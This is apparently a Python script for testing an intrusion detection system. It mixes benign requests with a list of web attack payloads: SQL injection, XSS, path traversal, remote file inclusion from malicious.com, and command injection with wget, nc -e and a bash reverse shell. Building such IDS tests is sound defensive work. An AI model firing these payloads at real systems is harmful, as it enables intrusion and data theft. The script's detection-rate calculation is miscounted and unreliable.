import requests
import time
import random
import logging
import os

# 配置日志
logging.basicConfig(filename='ids_test.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# 正常请求和攻击请求示例
normal_requests = [
    "http://example.com/?search=hello",
    "http://example.com/?search=test",
    "http://example.com/?page=home",
    "http://example.com/?page=about",
    "http://example.com/?id=1234",
    "http://example.com/?query=example"
]

attack_requests = [
    "http://example.com/whois_raw.cgi?fqdn=%0acat%20/etc/passwd",
    "http://example.com/faxsurvey?/bin/cat%20/etc/passwd",
    "http://example.com/sql_injection?query=' OR '1'='1",
    "http://example.com/sql_union?query=UNION SELECT null, null",
    "http://example.com/sql_error_based?query=' OR 1=1;--",
    "http://example.com/xss_simple?query=<script>alert('XSS')</script>",
    "http://example.com/xss_image?query=<img src=x onerror=alert('XSS')>",
    "http://example.com/xss_iframe?query=<iframe src=javascript:alert('XSS')>",
    "http://example.com/lfi_simple?file=../../../../etc/passwd",
    "http://example.com/lfi_php?file=../../../../etc/passwd",
    "http://example.com/rfi_php?include=http://malicious.com/shell.txt",
    "http://example.com/rce_wget?cmd=| wget http://malicious.com",
    "http://example.com/rce_nc?cmd=| nc -e /bin/sh",
    "http://example.com/rce_bash?cmd=| /bin/bash -i >& /dev/tcp/0.0.0.0/1234 0>&1",
    "http://example.com/ldap_injection?query=*)(|(cn=*))",
    "http://example.com/command_injection?cmd=; /bin/bash -c 'cat /etc/passwd'",
    "http://example.com/sqli_blind?query=1' AND 1=1--",
    "http://example.com/sqli_time?query=1' WAITFOR DELAY '0:0:5'--",
    "http://example.com/xss_style?query=<style>@import'javascript:alert('XSS')'</style>",
    "http://example.com/cmd_exec_php?cmd=<?php system($_GET['cmd']); ?>",
    "http://example.com/xss_body?query=<body onload=alert('XSS')>",
    "http://example.com/sql_bool_based?query=' OR 1=1 --",
    "http://example.com/sql_time_based?query='; WAITFOR DELAY '0:0:5' --",
    "http://example.com/xss_svg?query=<svg onload=alert('XSS')>",
    "http://example.com/xss_link?query=<link rel=stylesheet href=javascript:alert('XSS')>",
    "http://example.com/xss_cookie?query=<script>alert(document.cookie)</script>",
    "http://example.com/php_rce?cmd=<?php system($_GET['cmd']); ?>",
    "http://example.com/file_inclusion?file=http://example.com/shell.txt?"
]

def send_request(url):
    try:
        start_time = time.time()
        response = requests.get(url)
        end_time = time.time()
        response_time = end_time - start_time
        logging.info(f"URL: {url}, Status Code: {response.status_code}, Response Time: {response_time:.4f} seconds")
        return response.status_code, response_time
    except requests.RequestException as e:
        logging.error(f"Failed to send request to {url}: {e}")
        return None, None

def check_attack_detected():
    with open('packet_log.txt', 'r') as logfile:
        for line in logfile:
            if "Attack detected" in line:
                return True
    return False

def main():
    # 清空日志文件
    open('packet_log.txt', 'w').close()

    num_requests = 100
    attack_probability = 0.5  # 50% 概率发送攻击请求

    total_requests = 0
    total_response_time = 0
    attack_detected = 0

    for _ in range(num_requests):
        is_attack = random.random() < attack_probability
        if is_attack:
            url = random.choice(attack_requests)
        else:
            url = random.choice(normal_requests)

        status_code, response_time = send_request(url)
        if status_code and response_time is not None:
            total_requests += 1
            total_response_time += response_time
            if is_attack and check_attack_detected():
                attack_detected += 1

        # 等待一段时间再发送下一个请求，避免服务器过载
        time.sleep(random.uniform(0.1, 1.0))

    average_response_time = total_response_time / total_requests if total_requests else 0
    detection_rate = attack_detected / num_requests if num_requests else 0

    logging.info(f"Total Requests: {total_requests}")
    logging.info(f"Average Response Time: {average_response_time:.4f} seconds")
    logging.info(f"Attack Detection Rate: {detection_rate:.2%}")

if __name__ == "__main__":
    main()
